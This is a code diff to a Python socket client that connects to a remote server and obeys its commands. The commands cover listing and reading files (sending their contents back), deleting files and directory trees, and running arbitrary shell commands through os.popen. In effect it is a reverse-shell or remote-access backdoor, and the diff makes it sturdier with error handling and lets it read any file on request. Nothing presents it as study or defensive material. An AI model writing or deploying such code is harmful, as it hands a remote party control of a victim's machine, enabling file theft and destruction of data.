@@ -18,7 +18,7 @@ DC_MSG = "!dc"
 s.connect(SERVER)
 
 def getPWD():
-    pwd = f'{colorama.Back.BLACK}{colorama.Fore.YELLOW}{os.getcwd()}'
+    pwd = f'{colorama.Back.BLACK}{colorama.Fore.YELLOW}{os.getcwd()}{colorama.Back.RESET}{colorama.Fore.RESET}'
     return pwd
 
 cmdList = {}
@@ -36,60 +36,65 @@ elif platform == "win32":
 run = True
 while run:
     cmd = s.recv(BUFFER).decode(FORMAT)
-    if cmd == DC_MSG:
-        run = False
-        s.close()
-    elif re.search("^ls\s?", cmd):
-        lsItems = ""
-        lsDir = cmd.replace("ls", "")
-        lsDir = lsDir.replace(" ", "")
-        if len(lsDir) > 1:
-            ls = os.listdir(lsDir)
-        else:
-            ls = os.listdir()
-        for item in ls:
-            if os.path.isdir(item) and not re.search("^\.", item):
-                item = colorama.Back.YELLOW + colorama.Fore.BLACK + item + colorama.Back.RESET + colorama.Fore.RESET
-
-            if re.search("^\.", item):
-                lsItems += f"{colorama.Back.MAGENTA}{item}{colorama.Back.RESET}\t"
+    try:
+        if cmd == DC_MSG:
+            run = False
+            s.close()
+        elif re.search("^ls\s?", cmd):
+            lsItems = ""
+            lsDir = cmd.replace("ls", "")
+            lsDir = lsDir.replace(" ", "")
+            if len(lsDir) > 1:
+                ls = os.listdir(lsDir)
             else:
-                lsItems += item + "\t"
-        lsItems += "\n"
-        s.send(lsItems.encode(FORMAT))
-    elif re.search("^cd ", cmd):
-        newCmd = cmd.replace("cd ", "")
-        os.chdir(newCmd)
-        crrDir = f"Current dir: {getPWD()}\n"
-        s.send(crrDir.encode(FORMAT))
-    elif re.search("^pwd$", cmd):
-        pwd = getPWD() + "\n"
-        s.send(pwd.encode(FORMAT))
-    elif re.search("^rm -rf ", cmd):
-        toRemove = cmd.replace("rm -rf ", "")
-        rmtree(toRemove)
-        s.send(f"{colorama.Fore.GREEN}Dir: {toRemove} was deleted".encode(FORMAT))
-    elif re.search("^rm ", cmd):
-        toRemove = cmd.replace("rm ", "")
-        os.remove(toRemove)
-        s.send(f"{colorama.Fore.GREEN}File: {toRemove} was deleted".encode(FORMAT))
-    elif re.search("cat ", cmd):
-        catFile = cmd.replace("cat ", "")
-        try:
-            catFile = "./server.py"
-            fileCtn = open(catFile, "r")
-            lines = fileCtn.readlines()
-            ctn = ""
-            for line in lines:
-                ctn += line
-            s.send(ctn.encode(FORMAT))
-        except:
-            s.send(f"{colorama.Fore.RED}File doesnt't exist".encode(FORMAT))
-    
-    ### TODO -- test this function on other computer ###
-    elif re.search("^echo ", cmd):
-        os.popen(cmd)
-        print(cmd)
-    else:
-        os.popen(cmd)
-        s.send(f"Get command: {cmd}".encode(FORMAT))
+                ls = os.listdir()
+
+            if len(lsDir) > 2 and not re.search("/$", lsDir):
+                lsDir += "/"
+
+            for item in ls:
+                if os.path.isdir(lsDir + item) and not re.search("^\.", item):
+                    item = colorama.Back.YELLOW + colorama.Fore.BLACK + item + colorama.Back.RESET + colorama.Fore.RESET
+                if re.search("^\.", item):
+                    lsItems += f"{colorama.Back.MAGENTA}{item}{colorama.Back.RESET}  "
+                else:
+                    lsItems += item + "  "
+            lsItems += "\n"
+            s.send(lsItems.encode(FORMAT))
+        elif re.search("^cd ", cmd):
+            newCmd = cmd.replace("cd ", "")
+            os.chdir(newCmd)
+            crrDir = f"Current dir: {getPWD()}\n"
+            s.send(crrDir.encode(FORMAT))
+        elif re.search("^pwd$", cmd):
+            pwd = getPWD() + "\n"
+            s.send(pwd.encode(FORMAT))
+        elif re.search("^rm -rf ", cmd):
+            toRemove = cmd.replace("rm -rf ", "")
+            rmtree(toRemove)
+            s.send(f"{colorama.Fore.GREEN}Dir: {toRemove} was deleted".encode(FORMAT))
+        elif re.search("^rm ", cmd):
+            toRemove = cmd.replace("rm ", "")
+            os.remove(toRemove)
+            s.send(f"{colorama.Fore.GREEN}File: {toRemove} was deleted".encode(FORMAT))
+        elif re.search("cat ", cmd):
+            catFile = cmd.replace("cat ", "")
+            try:
+                fileCtn = open(catFile, "r")
+                lines = fileCtn.readlines()
+                ctn = ""
+                for line in lines:
+                    ctn += line
+                s.send(ctn.encode(FORMAT))
+            except:
+                s.send(f"{colorama.Fore.RED}File doesnt't exist".encode(FORMAT))
+        
+        ### TODO -- test this function on other computer ###
+        elif re.search("^echo ", cmd):
+            os.popen(cmd)
+            s.send(f"Exec {cmd}".encode(FORMAT))
+        else:
+            os.popen(cmd)
+            s.send(f"Get command: {cmd}".encode(FORMAT))
+    except:
+        s.send(f"Error from command: {colorama.Fore.RED}{cmd}{colorama.Fore.RESET}".encode(FORMAT))
